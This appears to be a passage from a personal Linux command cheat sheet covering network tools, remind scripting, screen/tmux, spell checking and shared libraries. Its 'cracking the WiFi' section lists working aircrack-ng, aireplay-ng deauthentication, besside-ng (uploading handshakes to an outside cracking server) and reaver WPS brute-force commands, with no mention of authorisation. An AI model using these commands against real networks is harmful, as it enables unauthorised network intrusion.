## infrastructure mode network − devices on the network communicate through an access point (usually a router), so they rely on a pre-existing infrastructure, for this configuration BSSID = MAC address
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# WiFi security:
--------------------------------------------------------------------------------
## pre-shared key (PSK) − a shared secret previously shared between the two parties before it needs to be used for authentication
## temporal key integrity protocol (TKIP) − a security protocol used in the 802.11 WiFi standard
## initialization vector (IV) − a fixed-size input to a cryptographic primitive
## wired equivalent privacy (WEP) provides data confidentiality comparable to that of a traditional wired network
## WiFi protected access (WPA) uses TKIP
## WiFi protected access II (WPA2) usually uses PSK
## WiFi protected setup (WPS) allows you to connect to a protected WLAN by usually pressing a WPS button on a router and then, within 2 minutes, pressing a similar button on a client, say, a printer (push button method) or additionally entering a PIN code generated by the router (PIN method), so you don't need to type the network credentials
--------------------------------------------------------------------------------

--------------------------------------------------------------------------------
# cracking the WiFi:
--------------------------------------------------------------------------------
## get the name of the WNIC:
iwconfig
## e.g. we get "wlp11s0"

## switch WNIC into the monitor mode:
sudo airmon-ng start wlp11s0
## iwconfig now prints "wlp11s0mon" instead of "wlp11s0"

## display all the APs and clients together with their MAC addresses within the range of WNIC:
sudo airodump-ng wlp11s0mon
## note that "<length: n>" in the SSID field means that the SSID is hidden and its length is n
## if n = 0 or n = 1, an AP does not reveal the actual length and the real length could be any value
## airodump-ng will capture a hidden SSID when a client associates with an AP

## to crack WPA/WPA2-protected networks, the authentication handshake (performed when a client connects to an AP) must be captured, which can be done:
### actively − you accelerate the process by deauthenticating an existing wireless client (your WNIC needs an injection capability)
### passively − you wait for a client to authenticate to the network

## capture the WPA authentication handshakes and IVs for the AP with "00:14:6C:7E:40:80" MAC address operating on channel 9 and write the results to "psk*" files:
sudo airodump-ng -c 9 --bssid 00:14:6C:7E:40:80 -w psk wlp11s0mon

## if no handshake is being captured for a long time, open a new terminal tab and deauthenticate the wireless client with "00:0F:B5:FD:FB:C2" MAC address from the AP with "00:14:6C:7E:40:80" MAC address:
sudo aireplay-ng -0 1 -a 00:14:6C:7E:40:80 -c 00:0F:B5:FD:FB:C2 wlp11s0mon

## open a new terminal tab and crack the PSK using previously created "psk*.cap" files and "/usr/share/doc/aircrack-ng/password.lst" and "big_list.txt" dictionary files:
aircrack-ng -w /usr/share/doc/aircrack-ng/password.lst,big_list.txt psk*.cap
## if you get "No valid WPA handshakes found" message, wait longer or try to deauthenticate an existing wireless client again with aireplay-ng as shown above

## to automatically crack WEP and WPA/WPA2-protected networks, use:
sudo besside-ng wlp11s0mon
## the WEP packets and IVs are written to the "wep.cap", they can be processed with
aircrack-ng wep.cap
## the WPA handshakes and IVs are written to the "wpa.cap" file which can be sent to the WPA-cracking server already during the attack:
sudo besside-ng -s "wpa.darkircop.org" wlp11s0mon
## or it can be processed with
aircrack-ng -w /usr/share/doc/aircrack-ng/password.lst wpa.cap

## crack WPA/WPA2-protected networks via a brute force attack against WPS:
### find a target with WPS enabled:
sudo wash -i wlp11s0mon
### try to crack an AP with "00:14:6C:7E:40:80" MAC address:
reaver -i wlp11s0mon -b 00:14:6C:7E:40:80 -vv

## switch WNIC back into the station mode to connect to a cracked network:
sudo airmon-ng stop wlp11s0mon
--------------------------------------------------------------------------------

# limit the bandwith on eth0 interface to 56 kbit/s (e.g. to simulate slow network connection):
sudo tc qdisc add dev eth0 root handle 1: htb default 12
sudo tc class add dev eth0 parent 1:1 classid 1:12 htb rate 56kbit ceil 56kbit
sudo tc qdisc add dev eth0 parent 1:12 netem delay 200ms

# turn off the bandwidth restriction on eth0:
sudo tc qdisc del dev eth0 root

# show listening ports:
netstat -tnlp

# check if port 22 is open on a remote host:
telnet erwin.oakland.edu 22

# set/change the hostname:
hostnamectl set-hostname mcb

# list available wireless frequencies:
iwlist freq

================================================================================
remind
================================================================================
# useful system variables:
$T = trigdate()
$Ty = year(trigdate())
$U = today()
$Uy = year(today())

# set string variable:
SET title "\"Poirot\""
REM 10 Jul 2017 ++2 MSG Watch [title] %a.
REM 10 Aug 2017 ++2 MSG Watch [title] %a.

# define a string function with a string argument:
FSET taxes_msg(country) "Tax return in " + country + " due %a."
REM 15 Apr +5 OMIT Sat Sun AFTER MSG [taxes_msg("the United States")]
REM 1 May --1 +5 OMIT Sat Sun AFTER MSG [taxes_msg("Poland")]

# report the previous month in a reminder message:
REM 10 +4 MSG Tax for [mon($T - 30)] %a.

# the global omits influence the counting of "+" delta and "-" back forms
# no omits influence the counting of "++" delta and "--" back forms

# the following script:
-------------------------------------------------------
$HOME/test.rem
-------------------------------------------------------
OMIT 1 Jan MSG New Year
OMIT 24 Dec MSG Christmas Eve
OMIT 25 Dec MSG 1st day of Christmas
OMIT 26 Dec MSG 2nd day of Christmas
REM 25 MSG Backup
REM 3 +4 MSG Rent
REM 1 -7 MSG Meeting
# Jan 3rd - 4 days = Dec 30th
# Jan 1st - 7 days = Dec 25th
-------------------------------------------------------
# which can be tested with e.g.
remind test.rem 2015-12-22
# in December/January issues the reminder for:
## "Backup" on Dec 25th, since global omits influence the counting of the "+" delta and "-" back forms only, and there is none here, so it doesn't matter that Dec 25th is omitted (to actually omit it, use the "SKIP"/"BEFORE"/"AFTER" commands)
## "Rent" on Jan 3rd, with the advance warning starting already on Dec 29th (instead of Dec 30th), since on the way there is one omitted day (Jan 1st):
### Jan 3rd - 4 days (from "+4") - 1 day (from omits) = Dec 29th (not omitted, don't move further back)
## "Meeting" on Dec 22nd (instead of Dec 25th), since on the way there are three omitted days (Dec 25th, Dec 26th and Jan 1st):
### Jan 1st - 7 days (from "-7") - 3 days (from omits) = Dec 22th (not omitted, don't move further back)

# but the following script:
-------------------------------------------------------
(...)
REM 3 ++4 MSG Rent
REM 1 --7 +1 MSG Meeting
-------------------------------------------------------
# in December/January issues the reminder for:
## "Rent" on Jan 3rd, with the advance warning starting on Dec 30th
## "Meeting" on Dec 25th, with the advance warning starting already on Dec 23rd (instead of Dec 24th) since for "+1" delta there is one omitted day (Dec 24th):
### Dec 25th - 1 day (from "+1") - 1 day (from omits) = Dec 23rd (not omitted, don't move further back)

# but for the following script:
-------------------------------------------------------
(...)
REM 25 SKIP MSG Backup
REM 1 --7 +1 SKIP MSG Meeting
-------------------------------------------------------
# no reminder for "Backup" is issued because of "SKIP"
# in December no reminder is issued for neither "Backup" nor "Meeting", since the Dec 25th is excluded by the "SKIP" command
# if we use "BEFORE" instead of "SKIP", the reminders are issued on Dec 23rd, with the advance warning for "Meeting" starting on Dec 22nd
# if we use "AFTER" instead of "SKIP", the reminders are issued on Dec 27th, with the advance warning for "Meeting" starting already on Dec 23rd (instead of Dec 26th) since "+1" delta moves the advance warning past the omitted days:
## Dec 27th - 1 day (from "+1") =
	Dec 26th (omitted, move back) →
	Dec 25th (omitted, move back) →
	Dec 24th (omitted, move back) →
	Dec 23rd (not omitted, don't move further back)

# note that the following script:
-------------------------------------------------------
(...)
REM 1 -7 +1 SKIP Meeting
-------------------------------------------------------
# is not influenced at all by the "SKIP" command as the global omits influence "-7" back form and move the date back past the omitted days so that the "Meeting" reminder is issued on Dec 22nd, with the advance warning starting on Dec 21st
# thus
REM 1 -7 +1 Meeting
# yields the same results

# obviously, the "SKIP"/"BEFORE"/"AFTER" commands shouldn't be used with "-" back form only which always moves the trigger date past the omitted days, so they serve no purpose

# the following script:
-------------------------------------------------------
$HOME/.reminders
-------------------------------------------------------
OMIT 11 Nov MSG Independence Day
REM Wed +1 AFTER MSG Meeting
-------------------------------------------------------
# in November 2015 (Nov 11th = Wednesday) issues the "Meeting" reminder on Nov 12th, but with the advance warning starting already on Nov 10th (instead of Nov 11th) since for "+1" delta there is one omitted day (Nov 11th), and:
## Nov 12th - 1 day (from "+1") - 1 day (from omits) = Nov 10th

# the following script:
-------------------------------------------------------
$HOME/.reminders
-------------------------------------------------------
FSET omitJulAug(x) isomitted(x) || (monnum(x) == 7) || (monnum(x) == 8)
REM Fri +1 OMITFUNC omitJulAug SKIP AT 19:00 +45 MSG Lesson
-------------------------------------------------------
# in 2018 doesn't issue any "Lesson" advance warnings in July nor August, but in 2017 issues that each day in July and August since Sep 1st = Friday, so "+1" moves the warning past the omitted days, which results in triggering the warning every day in those months
# it's better to use the "++1" delta form:
REM Fri ++1 OMITFUNC omitJulAug SKIP AT 19:00 +45 MSG Lesson
# resulting in the advance warning issued on last day in August 2017

# an event occurring on first Saturday of a month with the exception of July and August, moved back one week for each omitted Saturday:
REM Sat 1 --7 SATISFY ($Tm != 7 && $Tm != 8)
REM [$T] ++1 OMIT Sun Mon Tue Wed Thu Fri BEFORE AT 18:00 MSG Meeting %a %3.

# use "SCANFROM" with floating events, so that the event is still seen after it occurred:
REM Mon 1 Sep SCANFROM [$U - 7] SATISFY 1
OMIT [$T]
REM Mon AFTER MSG Meeting
# the "Mon 1 Sep" reminder is triggered every first Monday in September (Labour Day), which can move over a range of 7 days
# without "SCANFROM", on first Tuesday in September remind wouldn't count the previous Monday as omitted (we assume there no other omits) as it by default scans starting with the current date, so "Meeting" wouldn't be at all triggered that Tuesday
# with "SCANFROM" the "Meeting" is properly triggered on first Tuesday in September, but as there might be other omits, it's safer to use 7 days with "SCANFROM"

# Easter date:
## easterdate($U) = the date of the next Easter Sunday on or after $U
## easterdate($Uy) = the date of Easter Sunday for the current year
# so the following
SET edate easterdate($U)
REM [edate + 1] MSG Easter Monday
# wouldn't trigger "Easter Monday" reminder at all, since on Easter Monday "easterdate($U)" already yields the date of the Easter Sunday in the following year, so use
SET edate easterdate($Uy)
REM [edate + 1] MSG Easter Monday.
# instead

================================================================================
screen / tmux (terminal multiplexers)
================================================================================
--------------------------------------------------------------------------------
# screen
--------------------------------------------------------------------------------
# run a command in a new session called "compile", log all output to a file ("screenlog.n") and detach:
screen -dmLS compile ./script.sh
# run a command in a new session called "compile", log all output to a file ("screenlog.n") and detach in case you need "$LD_LIBRARY_PATH":
screen -dmLS compile bash -lc "make -j12"
# list sessions:
screen -ls
# attach a session (pid.tty.host):
screen -r 4194..fermi
# detach from a current session:
<CTRL>+"a" "d"

--------------------------------------------------------------------------------
# tmux
--------------------------------------------------------------------------------
# split window into top/bottom panes:
C-b "
# split window into left/right panes:
C-b %
# switch panes
c-b ;

================================================================================
spell checking
================================================================================
# spell-check a LaTeX file:
aspell -t check file.tex

# spell checking in vi:
:set spell
# to go to the next/previous error: "]s"/"[s", variants: "z="

================================================================================
shared libraries
================================================================================
# "*.so" shared-library files in non-standard locations, say "/opt/libs", can be added by:

## adding the location to the "$LD_LIBRARY_PATH":
export LD_LIBRARY_PATH=$LD_LIBRARY_PATH:/opt/libs

## rebuilding the cache stored in "/etc/ld.so.cache" (preferred way):
sudo -i
echo "/opt/libs" > /etc/ld.so.conf.d/optlibs.conf
ldconfig

# list libraries that a command, say "molpro", depends on:
ldd molpro

================================================================================
WWW
================================================================================
# search the archives of the mailman mailing lists: type the following in Google (octopus mailing list as an example):
inurl:http://www.tddft.org/pipermail/octopus-users/ something
